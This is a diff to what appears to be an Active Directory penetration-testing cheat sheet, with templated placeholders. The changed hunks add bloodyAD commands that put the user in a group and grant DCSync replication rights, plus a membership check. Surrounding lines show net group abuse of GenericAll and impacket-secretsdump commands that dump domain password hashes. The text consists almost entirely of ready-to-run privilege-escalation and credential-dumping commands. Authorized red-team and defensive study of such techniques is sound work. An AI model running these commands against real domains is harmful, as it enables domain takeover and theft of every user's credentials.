@@ -176,6 +176,8 @@ Quick GenericAll on a group → add self (LOLBIN), then clean up:
 ```cmd
 net group "{{GROUP_NAME}}" {{USERNAME}} /add /domain
 net group "{{GROUP_NAME}}" {{USERNAME}} /del /domain
+
+Get-ADPrincipalGroupMembership -Identity "{{USERNAME}}" | Select-Object Name
 ```
 
 > **Always clean up** the SPNs / group memberships / UAC flags you create.
@@ -203,6 +205,10 @@ Get-ObjectAcl "DC={{DOMAIN_NB}},DC=LOCAL" -ResolveGUIDs | ? { $_.ObjectAceType -
 > | `89e95b76-444d-4c62-991a-0facbeda640c` | DS-Replication-Get-Changes-In-Filtered-Set |
 
 ```bash
+bloodyAD --host {{DC_IP}} -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' add groupMember '{{GROUP_NAME}}' {{USERNAME}}
+bloodyAD --host {{DC_IP}} -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' get object {{USERNAME}} --attr memberOf
+bloodyAD --host {{DC_IP}} -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' add dcsync {{USERNAME}}
+
 # Linux — Impacket (dump one user or all)
 impacket-secretsdump -just-dc-user {{TARGET_USER}} {{DOMAIN}}/{{USERNAME}}:"{{PASSWORD}}"@{{DC_IP}}
 impacket-secretsdump -outputfile hashes -just-dc {{DOMAIN_NB}}/{{USERNAME}}@{{DC_IP}}
